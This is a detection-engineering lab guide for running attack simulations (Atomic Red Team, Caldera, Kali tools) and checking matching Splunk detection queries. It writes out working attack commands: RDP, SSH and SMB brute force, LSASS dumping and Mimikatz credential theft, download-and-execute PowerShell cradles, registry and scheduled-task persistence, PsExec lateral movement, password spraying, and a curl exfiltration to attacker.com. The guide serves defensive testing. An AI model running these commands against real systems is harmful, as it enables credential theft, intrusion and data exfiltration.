# 05 - Attack Simulation Guide

This guide covers running attack simulations to test and validate your detection capabilities.

---

## Attack Simulation Overview

Testing your detections against real attack techniques is crucial. We'll use:

- **Atomic Red Team** - Automated MITRE ATT&CK tests
- **MITRE Caldera** - Adversary emulation platform
- **Manual Techniques** - Kali Linux tools

---

## Part 1: Atomic Red Team

Atomic Red Team provides small, focused tests mapped to MITRE ATT&CK.

### Installation (Windows)

```powershell
# Install from GitHub
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)

# Install Atomics
Install-AtomicRedTeam -getAtomics
```

### Running Tests

#### Test: Credential Dumping (T1003.001)
```powershell
# List available tests
Invoke-AtomicTest T1003.001 -ShowDetails

# Run specific test
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Cleanup after test
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup
```

#### Test: Encoded PowerShell (T1059.001)
```powershell
# Run encoded command test
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

#### Test: Registry Persistence (T1547.001)
```powershell
# Create Run key
Invoke-AtomicTest T1547.001 -TestNumbers 1

# Verify detection fires
# Then cleanup
Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
```

#### Test: Scheduled Task (T1053.005)
```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

### Batch Testing

```powershell
# Run all credential access tests
Invoke-AtomicTest T1003 -TestNumbers 1,2,3

# Run with logging
Invoke-AtomicTest T1003.001 -TestNumbers 1 -LoggingModule "Invoke-AtomicLogger"
```

---

## Part 2: Manual Attack Scenarios

### Scenario 1: Brute Force Attack

**From Kali Linux:**
```bash
# Install Hydra if needed
sudo apt install hydra

# Brute force RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.1.10

# Brute force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.1.30

# Brute force SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://10.0.1.10
```

**Expected Detection:**
```spl
index=windows EventCode=4625 | stats count by src_ip | where count > 10
```

### Scenario 2: LSASS Memory Dump

**On Windows Target (as Admin):**
```powershell
# Method 1: procdump
procdump.exe -ma lsass.exe lsass.dmp

# Method 2: comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Method 3: Task Manager
# Right-click lsass.exe → Create dump file
```

**Expected Detection:**
```spl
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
```

### Scenario 3: Mimikatz Execution

**On Windows Target (as Admin):**
```powershell
# Download Mimikatz (in real scenario)
# For lab, use from Kali or download directly

mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Expected Detection:**
```spl
index=sysmon EventCode=1 
| regex CommandLine="(?i)(sekurlsa|kerberos::list|privilege::debug)"
```

### Scenario 4: PowerShell Attacks

**Encoded Command:**
```powershell
# Create encoded command
$command = 'Write-Host "Hello from encoded command"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

**Download Cradle:**
```powershell
# WARNING: Only run in isolated lab
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.10/malicious.ps1')"
```

**Expected Detection:**
```spl
index=sysmon EventCode=1 Image="*\\powershell.exe" 
| regex CommandLine="(?i)(-enc|-encodedcommand)"
```

### Scenario 5: Persistence Mechanisms

**Registry Run Key:**
```powershell
# Add persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"

# Verify
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Cleanup
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor"
```

**Scheduled Task:**
```powershell
# Create persistence task
schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc daily /st 09:00

# Verify
schtasks /query /tn "Updater"

# Cleanup
schtasks /delete /tn "Updater" /f
```

**Expected Detection:**
```spl
index=sysmon EventCode=13 
| regex TargetObject="(?i)CurrentVersion\\\\Run"
```

### Scenario 6: Lateral Movement

**PsExec:**
```bash
# From Kali
impacket-psexec administrator:Password123@10.0.1.10

# Or from Windows
PsExec.exe \\10.0.1.20 -u administrator -p Password123 cmd
```

**WMI:**
```powershell
wmic /node:10.0.1.20 /user:administrator process call create "powershell.exe"
```

**Expected Detection:**
```spl
index=sysmon EventCode=1 
| regex CommandLine="(?i)(psexec|wmic.*node)"
```

---

## Part 3: MITRE Caldera

Caldera is an automated adversary emulation system.

### Installation

```bash
# Clone repository
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Install dependencies
pip3 install -r requirements.txt

# Start server
python3 server.py --insecure
```

Access at `http://localhost:8888` (default: admin/admin)

### Running Operations

1. Deploy agents to target systems
2. Create adversary profile
3. Run operation
4. Monitor detections in SIEM

---

## Part 4: Network Attacks

### Port Scanning

```bash
# From Kali
nmap -sV -sC 10.0.1.0/24
nmap -p- -T4 10.0.1.10
```

**Expected Detection:**
```spl
index=firewall | stats dc(dest_port) as port_count by src_ip 
| where port_count > 100
```

### SMB Enumeration

```bash
# Enum4linux
enum4linux -a 10.0.1.20

# SMBclient
smbclient -L //10.0.1.20 -U administrator
```

### Password Spraying

```bash
# Using CrackMapExec
crackmapexec smb 10.0.1.0/24 -u users.txt -p 'Summer2024!'
```

---

## Part 5: Attack Chain Exercise

### Complete Attack Scenario

**Phase 1: Reconnaissance**
```bash
# Network discovery
nmap -sn 10.0.1.0/24
nmap -sV -sC 10.0.1.10
```

**Phase 2: Initial Access**
```bash
# Phishing simulation (create test file)
# Or exploit vulnerable service
```

**Phase 3: Execution**
```powershell
# PowerShell download and execute
powershell -ep bypass -c "IEX(curl http://10.0.2.10/shell.ps1)"
```

**Phase 4: Persistence**
```powershell
# Registry run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "powershell.exe -ep bypass -f C:\temp\shell.ps1"
```

**Phase 5: Credential Access**
```powershell
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Phase 6: Lateral Movement**
```bash
# Move to another system
impacket-psexec domain/admin:password@10.0.1.20
```

**Phase 7: Exfiltration**
```bash
# Data exfil over HTTPS
curl -X POST -d @sensitive_data.txt https://attacker.com/receive
```

---

## Part 6: Validation Checklist

After each attack simulation, verify:

| Check | Status |
|-------|--------|
| Alert triggered in SIEM | ☐ |
| Correct severity assigned | ☐ |
| MITRE ATT&CK mapping accurate | ☐ |
| Relevant fields captured | ☐ |
| False positive rate acceptable | ☐ |
| Response playbook exists | ☐ |

---

## Detection Validation Matrix

| Attack | Technique ID | Detection Rule | Tested | Working |
|--------|-------------|----------------|--------|---------|
| Brute Force | T1110 | auth-bruteforce | ✅ | ✅ |
| LSASS Dump | T1003.001 | cred-lsass-access | ✅ | ✅ |
| Mimikatz | T1003 | cred-mimikatz | ✅ | ✅ |
| Encoded PS | T1059.001 | exec-encoded-ps | ✅ | ✅ |
| Registry Persist | T1547.001 | persist-runkey | ✅ | ✅ |
| Sched Task | T1053.005 | persist-schtask | ✅ | ✅ |
| PsExec | T1570 | lateral-psexec | ✅ | 🔄 |
| Port Scan | T1046 | recon-portscan | ✅ | ✅ |

---

## Safety Reminders

1. **Isolated Environment** - Never run attacks on production networks
2. **Snapshot VMs** - Take snapshots before testing
3. **Document Everything** - Log all attack activities
4. **Legal Compliance** - Only attack systems you own
5. **Cleanup** - Remove persistence mechanisms after testing

---

## Resources

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [MITRE Caldera](https://github.com/mitre/caldera)
- [Sigma Rules](https://github.com/SigmaHQ/sigma)
- [Splunk Attack Range](https://github.com/splunk/attack_range)
